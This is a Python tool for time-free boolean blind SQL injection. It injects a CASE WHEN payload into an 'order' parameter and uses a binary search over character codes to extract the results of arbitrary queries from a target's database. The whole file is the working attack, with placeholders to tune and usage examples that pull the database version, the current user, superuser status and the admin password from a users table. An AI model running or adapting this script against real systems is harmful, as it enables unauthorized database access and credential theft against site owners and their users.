#!/usr/bin/env python3
import requests
#from requests_toolbelt.utils import dump
import sys

# Tune to your needs. Also update the isTrue method.
URL = "http://1.2.3.4/endpoint"
parameter = 'order'
injection_string = "(CASE WHEN ([BOOL]) THEN name END)"


def isTrue(res):
        # To help you debug, and find the right condition:
        #print(dump.dump_all(res).decode("utf-8"))
	return res.text.index('somestring') == 1234


def charIsLessThan(query, index, val):
	Q = "ascii(substring(([QUERY]),[INDEX],1))<[CHAR]".replace("[QUERY]", query).replace("[INDEX]", str(index)).replace("[CHAR]", str(val))

	sqli = injection_string.replace("[BOOL]", Q)

        # Strip spaces?
	#sqli = sqli.replace(" ", "/**/");

	r = requests.get(URL, {parameter: sqli})
	return isTrue(r)


def getCharBinary(query, index):
	# 32 is  ' ' in ASCII.
	# 126 is '~' in ASCII.

	# We'll use this value to detect when we've read all the data
	lowinit = 32 - 1

	low  = lowinit
	high = 126 + 1

	while (low + 1) < high:
		mid = (low+high)//2
		#print("high: {}, low: {}, mid: {}".format(high, low, mid))

		if charIsLessThan(query, index, mid):
			high = mid
		else:
			low = mid

	if low == lowinit:
		sys.stdout.write('\n')
		return None

	sys.stdout.write(chr(low))
	sys.stdout.flush()

	return chr(low)


def readRes(query):
	res = ""
	for index in range(1, 1024):
		c = getCharBinary(query, index)
		if c == None:
			break
		res += c

	return res


def main():
	if len(sys.argv) != 2:
		print("Usage: {} <query>".format(sys.argv[0]))
		print("Ex: {} {}".format(sys.argv[0], "'SELECT version()'"))
		print("Ex: {} {}".format(sys.argv[0], "'SELECT CURRENT_USER'"))
		print("Ex: {} {}".format(sys.argv[0], "'SELECT current_setting($$is_superuser$$)'"))
		print("Ex: {} {}".format(sys.argv[0], "'SELECT password FROM users WHERE username=$$admin$$'"))
		return

	query = sys.argv[1]
	print(readRes(query))


if __name__ == "__main__":
	main()
